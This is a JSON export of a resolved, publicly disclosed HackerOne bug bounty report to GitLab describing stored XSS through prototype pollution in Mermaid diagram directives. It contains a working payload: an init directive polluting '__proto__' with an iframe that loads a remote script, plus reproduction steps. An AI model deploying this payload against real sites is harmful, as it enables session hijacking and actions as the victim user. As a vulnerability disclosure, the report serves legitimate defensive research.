{
  "id": 1280002,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjgwMDAy",
  "url": "https://hackerone.com/reports/1280002",
  "title": "Stored XSS via Mermaid Prototype Pollution vulnerability",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-07-27T21:40:11.304Z",
  "submitted_at": "2021-07-27T21:40:11.411Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "misha98857",
    "url": "/misha98857",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/182/100/5197640d3e136b784b720fe2531ae6802e18164d_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-11-18T02:03:27.229Z",
  "bug_reporter_agreed_on_going_public_at": "2021-11-16T15:47:39.283Z",
  "team_member_agreed_on_going_public_at": "2021-11-18T02:03:26.995Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nI am continue investigating #1106238 and found additional vector for prototype pollution and stored xss.\n\n### Steps to reproduce\n\n1. Create an issue in any repository\n2. Create mermaid diagram with following payload:\n```\n%%{init: { '__proto__': {'template': '<iframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\\\">'}} }%%\n%%{init: { '__proto__': {'template': '<iframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\\\">'}} }%%\nsequenceDiagram\nAlice->>Bob: Hi Bob\nBob->>Alice: Hi Alice\n```\n3. This will pollute template attribute and, for example, if we click on the search bar after the page loaded, XSS will be executed. This still requires minimal user interaction.\n\n### POC\n\n1. Open https://gitlab.com/cataha319/stored-xss/-/issues/2\n2. After page loaded, try select search menu on top bar.\n\n{F1391031} {F1391036}\n\n### What is the current *bug* behavior?\n\nMermaid allows setting __proto__ attribute in the directive which leads to stored XSS.\n\n### What is the expected *correct* behavior?\n\nMermaid doesn't allow __proto__ attributed to being set in the directive and merged with the config.\n\n### Output of checks\n\nThis vulnerability was tested on gitlab.com. On a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.\n\n## Impact\n\nAn attacker who can add Mermaid diagram to the page will can steal some data or make any actions as user.",
  "bounty_amount": "3000.0",
  "formatted_bounty": "$3,000",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1391031,
      "file_name": "Screenshot_from_2021-07-28_01-27-59.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fuwkh9wqnmainjja5h9100nw4gah?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-07-28_01-27-59.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-07-28_01-27-59.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ5D3DAKJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T010618Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEID%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF%2B3UPYvUglW%2Fbx9s1joh%2BI1mV%2FZfHMSYvzeSJNyQdNMAiEAjX%2F17c9tQd7hnM9BL8wb3I0rwZsFDopcX%2FAYdOmflQoquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNP9U0XyOIZwHAW1HyqPBW4MBwdDHI7S5eHcs0Z3PgG25SMZ9CvKqfjSa7gDoWVCaEs0tUlsPfdLE8im8mZXBT465yHnRS3m2xT0%2BDtT1ek1MqkLmTwqqjjtmAf3nMh1mUsCMO5%2Fa8VeesQHFpfktEUsVWv8gaNNdHMMubwbqKGxR7N6UuzcGYVQo58GfG1o7qolLtPvGP5DGyiX2FhoKfaFfFOtfESPIuWK8d%2BWR0ZSl8MefKT9V8qJRaCX9v5tRUaa07KA1LMEokTS8neI%2BYhZqrfY1kT%2Fp%2BU2SauvqbdyRhOUv2dAzqix%2FD%2FSTawZXXEQHhFhppsQ0RPgabkaKTEqiZQZpm0xaJDZgkxMeOXTK5hNiq4jFNZkJuGDap%2BMG2YTd%2BmChH6OPyD%2Fh06hagLt5pHY6Q49GiL28SiwkgPNkRH5KzvOZZXoMLngH92%2BOvG3mzljoCEou6WM7o1zNAya6S6fNi%2BwNfxLBX65%2FPipoQi4CVGCYBAzCdem5j8m81v3G9kPuMMar2rJkYRDSX5NP3hhH2HO5CtdUxYQFlcWelT0hEVs8gCeq2R5LmV%2Be7tyOVEAasnbQA8N0qWqFJmHd3uzG0u1do31ShcgvhYjaMzzYOkfi0xaxVAHBvnIGemtjfWWWOJpPoDVV%2BSvrn%2F8p0FCFIN4K884d%2BURX9GXItH467K2YfpL6URldRW52C0U%2FzntA%2BDiF%2B9pNWETKVpyTjQpEPiHGcz5lzQct90SlVgc3T3lwYliVb4OonPGMH8xvYLqTddpMBDCJRaxL2BLvsmifXBQTm9Iyr0CT64XHLn5UBaz4%2BW0EhERggczOrwTo%2B3lbTerwtzw933bZk%2BB6XCQbptiG5G66MP7rQCAUTy%2BeuiSObRjLBkMEdAwwP%2B8xgY6sQGDUj85UynevAkoqiuKt4bRt1YZxteBi7bYKQPmH8LCA04fhz%2F8F0vChzzfkiWADBI3zbd3JwTLlfkmYgjNlmMG6xqocr3YPVIEB%2BTgRXuQ3heO9gcZ4cy00IRUXk7smZq4eQM48taXkWcvkr2SfulnfDP381kAVdxhh%2FoOp%2Brepeg5fE7Zy5NJTTk3mtWw6tH5hyJx7f%2BovYwNtq4u3WK2CB0MYqzLeK2bopaTWsUhuSE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=90133cf2fc464f6b0851100f9404a0eaddae76294110dd0f8a9b0d2f936e96b3",
      "file_size": 179920,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1391036,
      "file_name": "Screenshot_from_2021-07-28_01-35-22.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ftrjfg7x80oc0nkpdpr3he92rujo?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-07-28_01-35-22.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-07-28_01-35-22.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ5D3DAKJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T010618Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEID%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF%2B3UPYvUglW%2Fbx9s1joh%2BI1mV%2FZfHMSYvzeSJNyQdNMAiEAjX%2F17c9tQd7hnM9BL8wb3I0rwZsFDopcX%2FAYdOmflQoquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNP9U0XyOIZwHAW1HyqPBW4MBwdDHI7S5eHcs0Z3PgG25SMZ9CvKqfjSa7gDoWVCaEs0tUlsPfdLE8im8mZXBT465yHnRS3m2xT0%2BDtT1ek1MqkLmTwqqjjtmAf3nMh1mUsCMO5%2Fa8VeesQHFpfktEUsVWv8gaNNdHMMubwbqKGxR7N6UuzcGYVQo58GfG1o7qolLtPvGP5DGyiX2FhoKfaFfFOtfESPIuWK8d%2BWR0ZSl8MefKT9V8qJRaCX9v5tRUaa07KA1LMEokTS8neI%2BYhZqrfY1kT%2Fp%2BU2SauvqbdyRhOUv2dAzqix%2FD%2FSTawZXXEQHhFhppsQ0RPgabkaKTEqiZQZpm0xaJDZgkxMeOXTK5hNiq4jFNZkJuGDap%2BMG2YTd%2BmChH6OPyD%2Fh06hagLt5pHY6Q49GiL28SiwkgPNkRH5KzvOZZXoMLngH92%2BOvG3mzljoCEou6WM7o1zNAya6S6fNi%2BwNfxLBX65%2FPipoQi4CVGCYBAzCdem5j8m81v3G9kPuMMar2rJkYRDSX5NP3hhH2HO5CtdUxYQFlcWelT0hEVs8gCeq2R5LmV%2Be7tyOVEAasnbQA8N0qWqFJmHd3uzG0u1do31ShcgvhYjaMzzYOkfi0xaxVAHBvnIGemtjfWWWOJpPoDVV%2BSvrn%2F8p0FCFIN4K884d%2BURX9GXItH467K2YfpL6URldRW52C0U%2FzntA%2BDiF%2B9pNWETKVpyTjQpEPiHGcz5lzQct90SlVgc3T3lwYliVb4OonPGMH8xvYLqTddpMBDCJRaxL2BLvsmifXBQTm9Iyr0CT64XHLn5UBaz4%2BW0EhERggczOrwTo%2B3lbTerwtzw933bZk%2BB6XCQbptiG5G66MP7rQCAUTy%2BeuiSObRjLBkMEdAwwP%2B8xgY6sQGDUj85UynevAkoqiuKt4bRt1YZxteBi7bYKQPmH8LCA04fhz%2F8F0vChzzfkiWADBI3zbd3JwTLlfkmYgjNlmMG6xqocr3YPVIEB%2BTgRXuQ3heO9gcZ4cy00IRUXk7smZq4eQM48taXkWcvkr2SfulnfDP381kAVdxhh%2FoOp%2Brepeg5fE7Zy5NJTTk3mtWw6tH5hyJx7f%2BovYwNtq4u3WK2CB0MYqzLeK2bopaTWsUhuSE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=254818993a3c14cab677eaf1f3a2d57603e2e5ef385b4f6b54a0ea251a32bb9a",
      "file_size": 281491,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 48,
  "voters": [
    "g3ksec",
    "nighthunters",
    "rzx007x",
    "bl4de",
    "shamim_12__",
    "2026",
    "akashhamal0x01",
    "sudi",
    "snoopy101",
    "h4x0r_dz",
    "and 38 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
